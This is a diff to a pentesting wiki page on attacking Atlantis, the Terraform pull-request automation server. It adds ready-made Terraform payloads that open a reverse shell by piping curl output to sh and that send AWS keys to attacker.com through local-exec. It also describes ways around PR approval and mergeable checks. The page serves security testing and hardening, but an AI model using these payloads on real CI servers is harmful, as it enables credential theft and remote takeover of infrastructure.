@@ -4,7 +4,7 @@
 
 Atlantis basically helps you to to run terraform from Pull Requests from your git server.
 
-![](<../.gitbook/assets/image (307).png>)
+![](<../.gitbook/assets/image (307) (3).png>)
 
 ## Atlantis Access
 
@@ -76,7 +76,7 @@ Some configurations affects **how the repos are managed**. However, it's possibl
 
 #### PR Protections
 
-Atlantis allows to indicate if you want the **PR** to be **approved** by somebody else (even if that isn't set in the branch protection) and/or be **mergeable** (branch protections passed) **before running apply**. From a security point of view, to set both options a recommended.
+Atlantis allows to indicate if you want the **PR** to be **`approved`** by somebody else (even if that isn't set in the branch protection) and/or be **`mergeable` ** (branch protections passed) **before running apply**. From a security point of view, to set both options a recommended.
 
 In case `allowed_overrides` is True, these setting can be **overwritten on each project by the `/atlantis.yml` file**.
 
@@ -153,24 +153,92 @@ atlantis apply [options] -- [terraform apply flags]
 
 ## Attacks
 
-Atlantis could be exploited by
+### Atlantis plan RCE - Config modification in new PR
 
-* An attacker submitting a **pull request** that contains a **malicious Terraform file** that uses a **malicious provider or an** [**`external` data source**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) that **Atlantis** then **runs `terraform plan`** on (which it does automatically unless you've turned off automatic plans).
-*   Running **`terraform apply` on a malicious Terraform file with** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)****
+If you have write access over a repository you will be able to create a new branch on it and generate a PR. If you can **execute `atlantis plan` ** (or maybe it's automatically executed) **you will be able to RCE inside the Atlantis server**.
 
-    ```
-    resource "null_resource" "null" {
-      provisioner "local-exec" {
-        command = "curl https://cred-stealer.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
-      }
-    }
-    ```
-* Running **malicious custom build commands** specified in an `atlantis.yaml` file. Atlantis uses the `atlantis.yaml` file from the pull request branch, **not** `master`.
-* Someone adding **`atlantis plan/apply` comments on your valid pull requests** causing terraform to run when you don't want it to.
-* **Bitbucket**: Bitbucket Cloud does **not support webhook secrets**. This could allow attackers to **spoof requests from Bitbucket**. Ensure you are allowing only Bitbucket IPs.
-  * This means that an **attacker** could make **fake requests to Atlantis** that look like they're coming from Bitbucket.
-  * If you are specifying `--repo-allowlist` then they could only fake requests pertaining to those repos so the most damage they could do would be to plan/apply on your own repos.
-  * To prevent this, allowlist [Bitbucket's IP addresses](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (see Outbound IPv4 addresses).
+You can do this by making [**Atlantis load an external data source**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Just put a payload like the following in the `main.tf` file:
+
+```json
+data "external" "example" {
+  program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
+}
+```
+
+### Atlantis apply RCE - Config modification in new PR
+
+If you have write access over a repository you will be able to create a new branch on it and generate a PR. If you can **execute `atlantis apply` you will be able to RCE inside the Atlantis server**.
+
+However, you will usually need to bypass some protections:
+
+* **Mergeable**: If this protection is set in Atlantis, you can only run **`atlantis apply` if the PR is mergeable** (which means that the branch protection need to be bypassed).
+  * Check potential [**branch protections bypasses**](github-security/#branch-protection-bypass)****
+* **Approved**: If this protection is set in Atlantis, some **other user must approve the PR** before you can run `atlantis apply`
+  * By default you can abuse the [**Gitbot token to bypass this protection**](github-security/#github\_token)****
+
+Running **`terraform apply` on a malicious Terraform file with** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
+&#x20;**** You just need to make sure some payload like the following ones ends in the `main.tf` file:
+
+```json
+// Payload 1 to just steal a secret
+resource "null_resource" "secret_stealer" {
+  provisioner "local-exec" {
+    command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
+  }
+}
+
+// Payload 2 to get a rev shell
+resource "null_resource" "rev_shell" {
+  provisioner "local-exec" {
+    command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
+  }
+}
+```
+
+### Custom Workflow
+
+Running **malicious custom build commands** specified in an `atlantis.yaml` file. Atlantis uses the `atlantis.yaml` file from the pull request branch, **not** of `master`.\
+This possibility was mentioned in a previous section:
+
+{% hint style="danger" %}
+If the flag **** `allow_custom_workflows` is set to **True**, workflows can be **specified** in the **`atlantis.yaml`** file of each repo.\
+This will basically give **RCE in the Atlantis server to any user that can access that repo**.
+
+```yaml
+# atlantis.yaml
+version: 3
+projects:
+- dir: .
+  workflow: custom1
+workflows:
+  custom1:
+    plan:
+      steps:
+      - init
+      - run: my custom plan command
+    apply:
+      steps:
+      - run: my custom apply command
+```
+{% endhint %}
+
+### PR Hijacking
+
+If someone sends **`atlantis plan/apply` comments on your valid pull requests,** it will cause terraform to run when you don't want it to.
+
+Moreover, if you don't have configured in the **branch protection** to ask to **reevaluate** every PR when a **new commit is pushed** to it, someone could **write malicious configs** (check previous scenarios) in the terraform config, run `atlantis plan/apply` and gain RCE.
+
+This is the **setting** in Github branch protections:
+
+![](<../.gitbook/assets/image (307).png>)
+
+### Bitbucket
+
+Bitbucket Cloud does **not support webhook secrets**. This could allow attackers to **spoof requests from Bitbucket**. Ensure you are allowing only Bitbucket IPs.
+
+* This means that an **attacker** could make **fake requests to Atlantis** that look like they're coming from Bitbucket.
+* If you are specifying `--repo-allowlist` then they could only fake requests pertaining to those repos so the most damage they could do would be to plan/apply on your own repos.
+* To prevent this, allowlist [Bitbucket's IP addresses](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (see Outbound IPv4 addresses).
 
 ## Mitigations
 
